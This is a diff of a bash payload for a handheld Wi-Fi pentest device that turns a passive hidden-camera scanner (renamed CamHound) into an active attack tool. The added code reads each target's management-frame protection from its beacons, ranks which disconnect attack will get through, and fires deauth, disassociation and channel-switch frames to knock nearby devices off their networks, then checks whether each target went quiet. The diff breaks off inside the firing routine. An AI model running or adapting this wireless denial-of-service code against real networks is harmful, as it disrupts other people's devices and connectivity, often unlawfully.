@@ -1,11 +1,15 @@
 #!/bin/bash
-# Title: CamScout
+# Title: CamHound
 # Description: Passive Wi-Fi camera census for the Pager. Lists every camera-vendor and
 #              camera-capable 802.11 device PineAP Recon can hear, categorises it, grades it on
 #              a 0-100 confidence scale, and (on request) locks on one suspect to test whether it
 #              is streaming (Watch), whether it reacts to movement (Stimulus test) or where it is
 #              (Locate). Identity scan is passive and free; Watch/Locate pause Recon hopping for
-#              the duration of the lock. No LAN join, no transmit, no deauth.
+#              the duration of the lock. No LAN join. With RESPONSE=1 a fourth rung appears on the
+#              device card: read the target's PMF/beacon-protection posture from its own beacon,
+#              then disconnect it with deauth+disassoc, channel-switch announcements, or all three,
+#              and judge from Recon whether it actually went quiet. RESPONSE defaults to 0, in
+#              which case nothing is transmitted and the device card is unchanged.
 # Author: tsuinami-1112
 # Version: 1.0
 # Category: reconnaissance
@@ -13,7 +17,7 @@
 #               tcpdump (Watch only; without it Watch is greyed), hexdump, awk, iwinfo, timeout,
 #               /lib/hak5/oui.txt (fallback /rom/lib/hak5/oui.txt; fallback built-in OUI rows).
 # Data file:    cam_signatures.txt next to payload.sh (built-in copy used when missing).
-# Loot:         /root/loot/CamScout/{inventory.tsv,events.log,report_<run>.txt,watch_<ts>_<mac>.tsv}
+# Loot:         /root/loot/CamHound/{inventory.tsv,events.log,report_<run>.txt,watch_<ts>_<mac>.tsv}
 #
 # LED State Descriptions
 # SETUP              - loading signatures and preflight
@@ -24,6 +28,9 @@
 # CYAN VERYFAST      - Watch running (Recon hopping paused by the EXAMINE lock)
 # R SOLID            - Watch reached STREAM or EVENT (+ one long vibe)
 # B/C/Y/R SOLID      - Locate tiers cold/warm/strong/hot (click per sample, vibe at hot)
+# MAGENTA            - response transmitting (channel locked for the burst)
+# GREEN              - response MOVED: the target stopped transmitting (+ one long vibe)
+# YELLOW             - response NO_EFFECT or INCONCLUSIVE
 # FAIL               - preflight failure (no _pineap or no vendor table) then exit
 # FINISH, then OFF   - clean exit
 # States persist until the next cycle restores CYAN SLOW; set_state() never sleeps.
@@ -32,13 +39,13 @@
 #          SignalFence/live_probe (wlan1mon capture), find_hackers (RECON JSON shape),
 #          Tunnel_Rat (EXAMINE lock from a user payload). Design notes in README.md.
 
-PAYLOAD_REL="user/reconnaissance/CamScout"
-PAYLOAD_REL_ALT="recon/client/CamScout recon/access_point/CamScout"   # the v1.1 hooks live here
-PAYLOAD_NAME="camscout"
+PAYLOAD_REL="user/reconnaissance/CamHound"
+PAYLOAD_REL_ALT="recon/client/CamHound recon/access_point/CamHound"   # the v1.1 hooks live here
+PAYLOAD_NAME="camhound"
 VERSION="1.0"
 
 # ----------------------------------------------------------------------------- config block ---
-# Starred keys may be overridden without editing: PAYLOAD_SET_CONFIG camscout <KEY> <value>
+# Starred keys may be overridden without editing: PAYLOAD_SET_CONFIG camhound <KEY> <value>
 # All weights and thresholds are lab starting points; see README "Test matrix" (Measured column).
 MODE="ROOM"             # ROOM or SITE (menu toggle; changes alerting/proximity/sort, never the list)
 CYCLE_SECS=20           # * scan period (floor 5)
@@ -79,7 +86,17 @@ GPS=0                   # closest-approach GPS stamping (0 = off)
 KEEP_PCAP=0; KEEP_RAW=0 # Watch artefacts copied to loot
 ROW_W=22                # list row budget (spike 19; expected 36-40 on the default theme)
 RECON_IF="wlan1mon"     # PineAP monitor radio (tri-band)
-LOOT_DIR="/root/loot/CamScout"
+# response rung (recon+response). RESPONSE=0 keeps the payload recon-only and silent.
+RESPONSE=0              # * master switch for the response rung (0 = recon only)
+RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
+AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
+SCAN_IF="wlan0"         # posture cross-check iface: the enabled dummy sta on radio0 (2.4 GHz only)
+BCN_CAP_SECS=4          # seconds to wait for a beacon when reading a target's posture
+BCN_CAP_COUNT=5         # beacons to capture per posture read (first usable one is parsed)
+POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
+RESP_LOCK_SECS=20       # EXAMINE lock duration held across a response
+RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
+LOOT_DIR="/root/loot/CamHound"
 OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
 # identity weights (constants, not table columns)
 W_OUI=45; W_WEAK=20; W_MODULE=0; W_ENDPOINT=-25; W_SSID=45; W_SSID_WEAK=15
@@ -88,7 +105,7 @@ W_HIDDEN=10; W_KIT=35; W_KIT_WEAK=10; W_PROBE=5; W_RAND=-40
 W_STREAM_RATE=30; W_STREAM_FAST=35; W_SUSTAIN=10; W_ASYM=15; W_EVENT=60; W_EVENT_WEAK=40; W_BUSY=10; W_DOWN=-20
 # ------------------------------------------------------------------------- end config block ---
 
-# --- camscout lib begin ---
+# --- camhound lib begin ---
 shopt -s extglob nocasematch 2>/dev/null; shopt -u nocasematch
 declare -A SIG_VENDOR_PAT SIG_VENDOR_CAT SIG_VENDOR_TYPE   # keyed by label
 declare -A SIG_OUI_LABEL SIG_OUI_CAT                                        # keyed by hex prefix
@@ -131,6 +148,9 @@ set_state() {
     LOC2)         LED C SOLID ;;
     LOC3)         LED Y SOLID ;;
     LOC4)         LED R SOLID; VIBRATE 50 ;;
+    RESPOND)      LED MAGENTA ;;
+    RESPOND_HIT)  LED GREEN; VIBRATE 300 ;;
+    RESPOND_NIL)  LED YELLOW; VIBRATE 100 ;;
     FAIL)         LED FAIL; VIBRATE 500 ;;
     FINISH)       LED FINISH; LED OFF ;;
     OFF)          LED OFF ;;
@@ -158,6 +178,10 @@ load_overrides() {
   RSSI_MIN=$(cfg RSSI_MIN "$RSSI_MIN" -100)
   SOUND=$(cfg SOUND "$SOUND" 0)
   THR_STREAM_UP=$(cfg THR_STREAM_UP "$THR_STREAM_UP" 1)
+  RESPONSE=$(cfg RESPONSE "$RESPONSE" 0)
+  RESPONSE_CONFIRM=$(cfg RESPONSE_CONFIRM "$RESPONSE_CONFIRM" 0)
+  AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
+  POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
 }
 
 # install dir: the UI runs a copy from /tmp, so look for the data file where it can live
@@ -285,6 +309,193 @@ band_of() {
   local f="$1"
   if (( f >= 5925 )); then printf 6; elif (( f >= 4900 )); then printf 5; elif (( f >= 2400 )); then printf 2; else printf '?'; fi
 }
+
+# --- response posture begin ---
+# Which disconnect primitive can work against a target, read from its own beacon.
+#   RSN element (ID 48): RSN Capabilities, 2 octets little-endian, low octet first on the wire.
+#     MFPC (capable)  = bit 7 -> 0x80 of the low octet
+#     MFPR (required) = bit 6 -> 0x40 of the low octet
+#   Extended Capabilities (ID 127): Beacon Protection = bit 84 -> octet 10 (0-based), mask 0x10.
+#     Beacon protection is NOT in the RSNXE (ID 244) -- that element has no such bit.
+# Badges: D+C both work | D?+C deauth is per-client, CSA works | C CSA only
+#         NONE both blocked | NOINJ radio may not transmit here | ? posture unread
+declare -A POSTURE POSTURE_TS
+
+hex_octet() {   # hex_octet <hexstring> <index0> -> decimal octet, nonzero rc if short
+  local b="${1:$(( $2 * 2 )):2}"
+  [ ${#b} -eq 2 ] || return 1
+  [[ $b =~ ^[0-9a-fA-F]{2}$ ]] || return 1
+  printf '%d' "$(( 16#$b ))"
+}
+
+csa_injectable() {   # csa_injectable <band> <channel> -> 0 when the radio may legally transmit
+  local b="$1" c="$2"
+  [[ $c =~ ^[0-9]+$ ]] || return 1
+  case "$b" in
+    2) return 0 ;;
+    5) (( c >= 36 && c <= 48 )) && return 0
+       (( c >= 149 && c <= 165 )) && return 0
+       return 1 ;;          # 52-144 is DFS: cfg80211 marks it NO_IR, injection is dropped
+    *) return 1 ;;          # 6 GHz is NO_IR for injection, and always WPA3 anyway
+  esac
+}
+
+posture_from_caps() {   # posture_from_caps <rsncaps_hex|-> <extcap_hex|-> <band> <channel> -> badge
+  local rsn="$1" ext="$2" band="$3" ch="$4" lo o mfpc=0 mfpr=0 bp=0
+  csa_injectable "$band" "$ch" || { printf 'NOINJ'; return 0; }
+  if [ -z "$rsn" ] || [ "$rsn" = - ]; then printf '?'; return 0; fi
+  lo=$(hex_octet "$rsn" 0) || { printf '?'; return 0; }
+  (( lo & 0x80 )) && mfpc=1
+  (( lo & 0x40 )) && mfpr=1
+  if [ -n "$ext" ] && [ "$ext" != - ]; then
+    if o=$(hex_octet "$ext" 10); then (( o & 0x10 )) && bp=1; fi
+  fi
+  if   (( mfpr && bp )); then printf 'NONE'
+  elif (( mfpr ));       then printf 'C'
+  elif (( mfpc ));       then printf 'D?+C'
+  else                        printf 'D+C'
+  fi
+}
+
+# The three operator-selectable attacks. The badge advises; it never decides.
+#   DEAUTH  PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  deauth + disassoc
+#   CSA     PINEAPPLE_DEAUTH_CLIENT_CSA [bssid] [channel]           channel-switch announcements
+#   BOTH    PINEAPPLE_DEAUTH_CLIENT_ALL [bssid] [target] [channel]  all three frame types
+response_cmd() {
+  case "$1" in
+    DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
+    CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
+    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT_ALL' ;;
+    *)      printf '' ;;
+  esac
+}
+
+# posture_opts <badge> -> viable attack keys, best first; empty when nothing can reach the air
+posture_opts() {
+  case "$1" in
+    'NOINJ'|'NONE') printf '' ;;                 # regulatory wall, or beacon protection: nothing works
+    'C')            printf 'CSA BOTH DEAUTH' ;;  # PMF required: deauth is ignored but stays offered
+    *)              printf 'BOTH DEAUTH CSA' ;;
+  esac
+}
+
+# posture_expect <badge> <attack key> -> works | partial | blocked | unknown
+# Labels each option honestly in the picker so a deliberate no-hope attempt is still the operator's call.
+posture_expect() {
+  local b="$1" k="$2"
+  [ "$b" = NOINJ ] && { printf 'blocked'; return 0; }
+  [ "$b" = '?' ]   && { printf 'unknown'; return 0; }
+  case "$k" in
+    DEAUTH)      case "$b" in 'D+C') printf 'works' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
+    CSA|BOTH)    case "$b" in 'NONE') printf 'blocked' ;; *) printf 'works' ;; esac ;;
+    *)           printf 'unknown' ;;
+  esac
+}
+
+# ---- beacon posture read -------------------------------------------------------------------
+# Walks a captured beacon's tagged parameters for element 48 (RSN) and 127 (Extended Capabilities).
+# No managed interface on this device can scan 5/6 GHz (radio0 is 2g, radio1 is monitor-only), so
+# the beacon on RECON_IF is the only posture source that covers every band CamHound reports on.
+POSTURE_RSN=-; POSTURE_EXT=-; BCN_HEX=""; BCN_IES=0
+
+hex_u16le() {   # hex_u16le <hexstring> <index0> -> decimal, nonzero rc if short
+  local a b
+  a=$(hex_octet "$1" "$2") || return 1
+  b=$(hex_octet "$1" "$(( $2 + 1 ))") || return 1
+  printf '%d' "$(( a + b * 256 ))"
+}
+
+ie_find() {   # ie_find <hexstring> <first element octet> <element id> -> payload hex, rc 1 if absent
+  local h="$1" p="$2" want="$3" id len n
+  n=$(( ${#h} / 2 ))
+  while (( p + 2 <= n )); do
+    id=$(hex_octet "$h" "$p") || return 1
+    len=$(hex_octet "$h" "$(( p + 1 ))") || return 1
+    (( p + 2 + len > n )) && return 1          # truncated element chain: stop, do not guess
+    if (( id == want )); then printf '%s' "${h:$(( (p + 2) * 2 )):$(( len * 2 ))}"; return 0; fi
+    p=$(( p + 2 + len ))
+  done
+  return 1
+}
+
+rsn_caps() {   # rsn_caps <element 48 payload hex> -> 2-octet RSN Capabilities hex, low octet first
+  local h="$1" p=6 n cnt                       # skip version (2) + group cipher suite (4)
+  n=$(( ${#h} / 2 ))
+  (( n >= 8 )) || return 1
+  cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # pairwise suite list
+  (( p + 2 <= n )) || return 1
+  cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # AKM suite list
+  (( p + 2 <= n )) || return 1
+  printf '%s' "${h:$(( p * 2 )):4}"
+}
+
+pcap_bytes() {   # whole file as one lowercase hex string (od fallback mirrors pcap_words)
+  if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/1 "%02x"' "$1" 2>/dev/null
+  else od -An -v -tx1 "$1" 2>/dev/null | tr -d ' \n'; fi
+}
+
+beacon_find() {   # beacon_find <pcap> -> sets BCN_HEX and BCN_IES at the first beacon's elements
+  local f="$1" h p n rec rt fc
+  h=$(pcap_bytes "$f") || return 1
+  [ -n "$h" ] || return 1
+  case "${h:0:8}" in d4c3b2a1|a1b2c3d4|4d3cb2a1|a1b23c4d) ;; *) return 1 ;; esac
+  n=$(( ${#h} / 2 )); p=24                     # pcap global header
+  while (( p + 16 <= n )); do
+    rec=$(hex_u16le "$h" "$(( p + 8 ))") || return 1   # incl_len; low 16 bits suffice for a beacon
+    p=$(( p + 16 ))
+    (( rec > 0 && p + rec <= n )) || return 1
+    rt=$(hex_u16le "$h" "$(( p + 2 ))") || return 1    # radiotap it_len
+    if (( rt >= 8 && rt + 36 <= rec )); then
+      fc=$(hex_octet "$h" "$(( p + rt ))")
+      # 0x80 = protocol version 0, type management, subtype beacon
+      if [ "$fc" = 128 ]; then BCN_HEX="$h"; BCN_IES=$(( p + rt + 36 )); return 0; fi
+    fi
+    p=$(( p + rec ))
+  done
+  return 1
+}
+
+posture_read_pcap() {   # posture_read_pcap <pcap> <band> <channel> -> badge
+  local f="$1" band="$2" ch="$3" rsn ext caps
+  POSTURE_RSN=-; POSTURE_EXT=-
+  if beacon_find "$f"; then
+    if rsn=$(ie_find "$BCN_HEX" "$BCN_IES" 48); then
+      caps=$(rsn_caps "$rsn") && POSTURE_RSN="$caps"
+    else
+      POSTURE_RSN=0000                         # no RSN element at all: open network, no PMF
+    fi
+    ext=$(ie_find "$BCN_HEX" "$BCN_IES" 127) && POSTURE_EXT="$ext"
+  fi
+  posture_from_caps "$POSTURE_RSN" "$POSTURE_EXT" "$band" "$ch"
+}
+
+capture_beacon() {   # capture_beacon <bssid> -> pcap path on stdout, rc 1 on failure
+  local bssid="$1" out="/tmp/cs_bcn_$$.pcap" p w=0
+  [ "$HAVE_TCPDUMP" = 1 ] || return 1
+  rm -f "$out"
+  tcpdump -i "$RECON_IF" -nn -s 0 -c "$BCN_CAP_COUNT" -w "$out" \
+    "type mgt subtype beacon and wlan addr2 $bssid" >/dev/null 2>&1 & p=$!
+  child_add "$p"
+  while (( w < BCN_CAP_SECS )); do kill -0 "$p" 2>/dev/null || break; sleep 1; w=$(( w + 1 )); done
+  kill -TERM "$p" 2>/dev/null; wait "$p" 2>/dev/null; child_del "$p"
+  [ -s "$out" ] || { rm -f "$out"; return 1; }
+  printf '%s' "$out"
+}
+
+posture_of() {   # posture_of <bssid> <band> <channel> -> badge, cached per BSSID for POSTURE_TTL
+  local bssid="$1" band="$2" ch="$3" f b now="$EPOCHSECONDS"
+  if [ -n "${POSTURE[$bssid]}" ] && (( now - ${POSTURE_TS[$bssid]:-0} < POSTURE_TTL )); then
+    printf '%s' "${POSTURE[$bssid]}"; return 0
+  fi
+  # A channel we may not transmit on needs no capture: the answer is NOINJ whatever the beacon says.
+  if [ "$(posture_from_caps - - "$band" "$ch")" = NOINJ ]; then
+    POSTURE[$bssid]=NOINJ; POSTURE_TS[$bssid]=$now; printf 'NOINJ'; return 0
+  fi
+  if f=$(capture_beacon "$bssid"); then b=$(posture_read_pcap "$f" "$band" "$ch"); rm -f "$f"; else b='?'; fi
+  POSTURE[$bssid]="$b"; POSTURE_TS[$bssid]=$now
+  printf '%s' "$b"
+}
+# --- response posture end ---
 
 cleanup() {
   [ "$(cat "$LOCK_FILE" 2>/dev/null)" = "$$" ] || return 0
@@ -597,7 +808,7 @@ preflight() {
   local i a
   mkdir -p "$LOOT_DIR" 2>/dev/null
   printf -v RUN_ID '%(%Y%m%d_%H%M%S)T' -1; RUN_T0=$EPOCHSECONDS
-  if ! command -v _pineap >/dev/null 2>&1; then set_state FAIL; ERROR_DIALOG "CamScout: _pineap not found" 2>/dev/null; exit 0; fi
+  if ! command -v _pineap >/dev/null 2>&1; then set_state FAIL; ERROR_DIALOG "CamHound: _pineap not found" 2>/dev/null; exit 0; fi
   command -v jq >/dev/null 2>&1 && HAVE_JQ=1
   command -v tcpdump >/dev/null 2>&1 && command -v hexdump >/dev/null 2>&1 && HAVE_TCPDUMP=1
   [ -r "$OUI_FILE" ] || OUI_FILE="$OUI_FILE_ALT"
@@ -607,14 +818,14 @@ preflight() {
   [ -n "$a" ] && { BANDS_LINE="$a"; [[ $a != *6* ]] && BANDS_LINE+=" (6 GHz not scanned)"; }
   if [ -f "$INSTALL_DIR/cam_signatures.txt" ]; then load_signatures "$INSTALL_DIR/cam_signatures.txt"; SIG_SOURCE="file"; fi
   if (( SIG_COUNT < 10 )); then load_signatures <(builtin_signatures); SIG_SOURCE="built-in"; fi
-  (( SIG_COUNT == 0 )) && { set_state FAIL; ERROR_DIALOG "CamScout: no signatures" 2>/dev/null; exit 0; }
+  (( SIG_COUNT == 0 )) && { set_state FAIL; ERROR_DIALOG "CamHound: no signatures" 2>/dev/null; exit 0; }
 }
 BANDS_LINE=""; INSTALL_DIR=""
 run_lock() {
   local pid
   pid=$(cat "$LOCK_FILE" 2>/dev/null)
   if [[ $pid =~ ^[0-9]+$ ]] && kill -0 "$pid" 2>/dev/null && grep -qa payload "/proc/$pid/cmdline" 2>/dev/null; then
-    LOG red "CamScout already running (pid $pid)"; exit 0
+    LOG red "CamHound already running (pid $pid)"; exit 0
   fi
   kill_children; pkill -f "^_pineap MONITOR" 2>/dev/null   # anchored: only a real MONITOR process
   printf '%s' "$$" >"$LOCK_FILE"; : >"$CHILD_FILE"
@@ -625,7 +836,7 @@ run_lock() {
     _pineap EXAMINE CANCEL; PINEAPPLE_EXAMINE_RESET
     [ "$(cat "$LOCK_FILE" 2>/dev/null)" = "$MAIN_PID" ] && rm -f "$LOCK_FILE" "$CHILD_FILE" ) >/dev/null 2>&1 &
 }
-# --- camscout lib end ---
+# --- camhound lib end ---
 
 # ================================================================================== cycle ===
 declare -A SCORED HINTED NOALERT PENDING_OFFER
@@ -815,6 +1026,10 @@ offer_dialogs() {
     elif [ "$AUTO_LOCATE" = 1 ] && is_setup_ap "$mac" && (( ${CONF[$mac]} >= 45 )); then
       if confirm "${BANDNAME[$mac]} ${ID_LABEL[$mac]} ${mac:9} (setup AP): Locate?"; then locate_target "$mac"; fi
       return 0
+    elif [ "${BANDNAME[$mac]}" = CONFIRMED ] && auto_respond_ok "$mac"; then
+      # secondary path: a CONFIRMED device that cannot be Watched at all (no tcpdump, not associated)
+      if confirm "${BANDNAME[$mac]} ${ID_LABEL[$mac]} ${mac:9}: Disrupt?"; then disrupt_menu "$mac"; fi
+      return 0
     elif [ "${BANDNAME[$mac]}" = CONFIRMED ] && [ "$ALERT_DIALOG" = 1 ]; then
       ALERT "CONFIRMED ${ID_LABEL[$mac]}" "${mac} ${CONF[$mac]} ${TAGS[$mac]}" 2>/dev/null; return 0
     fi
@@ -945,7 +1160,7 @@ tag_lines() {   # tag_lines mac -> TAGTXT (one meaning per tag, max 3)
 TAGTXT=""
 
 detail_card() {
-  local mac="$1" def="${2:-}" age wrow
+  local mac="$1" def="${2:-}" age wrow drow
   [ -n "$mac" ] || return 0
   while :; do
     age=$(( EPOCHSECONDS - ${LAST_SEEN[$mac]:-$EPOCHSECONDS} ))
@@ -953,8 +1168,10 @@ detail_card() {
     LOG "[$MODE] ${CONF[$mac]} ${BANDNAME[$mac]} ${ROLE[$mac]} $mac"$'\n'"cat: ${CAT[$mac]} ${VENDOR[$mac]:--}"$'\n'"ssid: ${SSID_CLEAN[$mac]:--} ch${CH[$mac]:-?} ${BAND[$mac]:-?}GHz"$'\n'"rssi ${RSSI_LAST[$mac]:--} best ${RSSI_BEST[$mac]:--} ${PROX[$mac]:-?} ${age}s ago"$'\n'"${TAGTXT%$'\n'}"
     if watchable "$mac"; then wrow="Watch"; elif [ "$HAVE_TCPDUMP" != 1 ]; then wrow="Watch (no tcpdump)"; else wrow="Watch n/a (not associated)"; fi
     [ "$def" = watch ] && def="$wrow" || def="Back"
-    pick_list "${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9}" "$def" "$wrow" "Locate" "Ignore for session" "Back" || return 0
+    drow=""; [ "$RESPONSE" = 1 ] && drow=$(disrupt_row "$mac")
+    pick_list "${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9}" "$def" "$wrow" ${drow:+"$drow"} "Locate" "Ignore for session" "Back" || return 0
     case "$PICK" in
+      "Disrupt"*) disrupt_menu "$mac" ;;
       "Watch") watch_menu "$mac" ;;
       "Watch n/a"*) LOG "probe-only: identity + Locate only; Locate updates on probe bursts (15-60 s) and the MAC may rotate" ;;
       "Watch (no tcpdump)") LOG "tcpdump missing: opkg update; opkg install tcpdump" ;;
@@ -998,14 +1215,14 @@ main_menu() {
   local def="Scan"
   while :; do
     local -a menu=("Scan" "Review hits"); [ "$SHOW_MODULES" = 1 ] && menu+=("Unidentified modules"); menu+=("Mode" "Write report" "Exit")
-    pick_list "CamScout $VERSION [$MODE] sigs:$SIG_COUNT" "$def" "${menu[@]}" || { def="Exit"; continue; }
+    pick_list "CamHound $VERSION [$MODE] sigs:$SIG_COUNT" "$def" "${menu[@]}" || { def="Exit"; continue; }
     case "$PICK" in
       "Scan") scan_loop || def="Exit" ;;
       "Review hits") review_list || def="Exit" ;;
       "Unidentified modules") modules_list ;;
       "Mode") mode_menu ;;
       "Write report") write_report; LOG "report: $LOOT_DIR/report_$RUN_ID.txt" ;;
-      "Exit") if confirm "Exit CamScout?"; then return 0; fi; def="Scan" ;;
+      "Exit") if confirm "Exit CamHound?"; then return 0; fi; def="Scan" ;;
     esac
   done
 }
@@ -1236,14 +1453,23 @@ summary_card() {
   case "$V_WORD" in STREAM|EVENT) col=red; set_state WATCH_HIT ;; EVENT?) col=yellow; set_state LANE ;; DOWN) col=cyan; set_state SCAN ;; *) col=""; set_state SCAN ;; esac
   LOG $col "$V_WORD$weak $( [ "$mode" = stim ] && printf 'best of %s' "${RUNS_N[$mac]}" ) -> ${CONF[$mac]} ${BANDNAME[$mac]}"
   LOG "up $(fmt10 "$up10")/s dn $(fmt10 "$dn10")/s as $( (( as10 >= 0 )) && fmt10 "$as10" || printf -- -) cv $cv"$'\n'"~$(rate_band "$up10") Mbps band"$'\n'"${V_TEXT}"
+  # A STREAM/EVENT verdict is the strongest evidence CamHound can produce that this is a live
+  # camera, so it is where the response funnel belongs: detect -> Watch -> confirmed -> Disrupt.
+  if [ "$V_WORD" = STREAM ] || [ "$V_WORD" = EVENT ]; then
+    if auto_respond_ok "$mac" && confirm "Streaming confirmed. Disrupt ${ID_LABEL[$mac]:-${mac:9}}?"; then
+      disrupt_menu "$mac"; return 0
+    fi
+  fi
   if [ "$V_WORD" = STREAM ] || [ "$V_WORD" = EVENT ] || (( ${CONF[$mac]} >= 45 )); then
     if [ "$AUTO_LOCATE" = 1 ] && confirm "Locate ${ID_LABEL[$mac]:-${mac:9}}?"; then locate_target "$mac"; return 0; fi
   fi
   local -a items=(); [ "$mode" = stim ] && items+=("Repeat (${RUNS_N[$mac]}/$MAX_RUNS)")
+  [ "$RESPONSE" = 1 ] && items+=("$(disrupt_row "$mac")")
   items+=("Locate" "Watch again" "Back")
   pick_list "$V_WORD ${mac:9}" "Back" "${items[@]}" || return 0
   case "$PICK" in
     "Repeat"*) stimulus_test "$mac" ;;
+    "Disrupt"*) disrupt_menu "$mac" ;;
     "Locate") locate_target "$mac" ;;
     "Watch again") WATCH_AGAIN=$((WATCH_AGAIN + 1)); (( WATCH_AGAIN <= 5 )) && live_view "$mac" ;;
   esac
@@ -1367,6 +1593,160 @@ locate_target() {
   set_state SCAN; BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
   return 0
 }
+# --- response rung begin ---
+# Operator-driven disconnect. Nothing transmits unless RESPONSE=1 AND the operator picks an attack
+# from the device card; there is no automatic path from a detection to the air.
+RESP_HDR='#epoch|mac|role|bssid|target|ch|band|badge|rsn_caps|beacon_prot|attack|cmd|lock|pk_before|pk_after|verdict'
+R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'
+
+resp_target() {   # resp_target <mac> -> sets R_BSSID R_TARGET R_CH R_BAND; rc 1 when unattackable
+  local mac="$1" ap
+  R_BSSID=""; R_TARGET=""; R_CH="${CH[$mac]:-0}"; R_BAND="${BAND[$mac]:-?}"
+  if [ "${ROLE[$mac]}" = cli ]; then
+    ap="${AP_OF[$mac]:--}"
+    [ "$ap" = - ] || [ -z "$ap" ] && return 1      # unassociated: no BSS to announce from
+    R_BSSID="$ap"; R_TARGET="$mac"
+    [ -n "${CH[$ap]}" ] && [ "${CH[$ap]}" != - ] && R_CH="${CH[$ap]}"   # a client rides its AP's channel
+    [ -n "${BAND[$ap]}" ] && R_BAND="${BAND[$ap]}"
+  else
+    R_BSSID="$mac"; R_TARGET="ff:ff:ff:ff:ff:ff"
+  fi
+  [[ $R_CH =~ ^[0-9]+$ ]] || return 1
+  (( R_CH > 0 )) || return 1
+  return 0
+}
+
+recon_stat() {   # recon_stat <mac> -> "packets last_seen", rc 1 when recon has no such row
+  local mac="${1,,}" m a pk sig pr fr t ch ssid hid
+  while IFS='|' read -r m a pk sig pr fr t ch; do
+    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
+  done < <(recon_lines CLIENTS)
+  while IFS='|' read -r m pk ssid ch fr sig hid t; do
+    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
+  done < <(recon_lines APS)
+  return 1
+}
+
+# resp_verdict <pk0> <t0> <pk1> <t1> <present_after> -> MOVED | NO_EFFECT | INCONCLUSIVE
+# Every kernel-side drop path reports success, so "we sent it" proves nothing. Only the target's
+# own behaviour afterwards does, and a stalled packet counter is the strongest signal recon gives.
+resp_verdict() {
+  local p0="$1" t0="$2" p1="$3" t1="$4" present="$5"
+  [ "$present" = 0 ] && { printf 'MOVED'; return 0; }           # dropped out of recon entirely
+  [ -z "$p0" ] || [ "$p0" = - ] && { printf 'INCONCLUSIVE'; return 0; }
+  [ -z "$p1" ] || [ "$p1" = - ] && { printf 'INCONCLUSIVE'; return 0; }
+  [[ $p0 =~ ^[0-9]+$ && $p1 =~ ^[0-9]+$ ]] || { printf 'INCONCLUSIVE'; return 0; }
+  (( p1 > p0 )) && { printf 'NO_EFFECT'; return 0; }            # still transmitting
+  [ "$t1" = "$t0" ] && { printf 'MOVED'; return 0; }            # counter stalled, nothing newer seen
+  printf 'INCONCLUSIVE'
+}
+
+resp_write() {   # resp_write <mac> <badge> <attack> <cmd> <lock> <pk0> <pk1> <verdict>
+  local f="$LOOT_DIR/responses.tsv" bp=-
+  [ "$POSTURE_EXT" = - ] || bp=$(hex_octet "$POSTURE_EXT" 10 2>/dev/null) || bp=-
+  [ -s "$f" ] || printf '%s\n' "$RESP_HDR" >"$f" 2>/dev/null
+  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
+    "$EPOCHSECONDS" "$1" "${ROLE[$1]:--}" "$R_BSSID" "$R_TARGET" "$R_CH" "$R_BAND" \
+    "$2" "${POSTURE_RSN:--}" "$bp" "$3" "$4" "$5" "$6" "$7" "$8" >>"$f" 2>/dev/null
+}
+
+resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
+  local mac="$1" k="$2" badge="$3" cmd lock rc s p0=- t0=- p1=- t1=- present=1 verdict
+  cmd=$(response_cmd "$k")
+  [ -n "$cmd" ] || return 1
+  if ! command -v "$cmd" >/dev/null 2>&1; then
+    LOG red "$cmd not present in this firmware"; log resp "missing $cmd"; return 1
+  fi
+  if s=$(recon_stat "$R_TARGET"); then read -r p0 t0 <<<"$s"; fi
+  lock_target "$R_BSSID" "$RESP_LOCK_SECS"; rc=$?
+  case $rc in 0) lock=ok ;; 1) lock=by-channel ;; *) lock=failed ;; esac
+  if (( rc == 2 )); then
+    unlock_target
+    LOG red "lock failed: $LOCK_TEXT"; log resp "lock-failed $R_BSSID $LOCK_TEXT"
+    resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" - LOCK_FAILED
+    set_state INCONCLUSIVE; return 1
+  fi
+  set_state RESPOND
+  LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock"
+  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock"
+  if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>&1
+  else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>&1; fi
+  sleep "$RESP_SETTLE_SECS"
+  if s=$(recon_stat "$R_TARGET"); then read -r p1 t1 <<<"$s"; else present=0; fi
+  unlock_target
+  verdict=$(resp_verdict "$p0" "$t0" "$p1" "$t1" "$present")
+  resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" "$p1" "$verdict"
+  log resp "verdict $verdict $R_TARGET pk $p0 -> $p1 present=$present"
+  case "$verdict" in
+    MOVED)     set_state RESPOND_HIT; LOG green "$verdict: target went quiet" ;;
+    NO_EFFECT) set_state RESPOND_NIL; LOG yellow "$verdict: still transmitting (pk $p0 -> $p1)" ;;
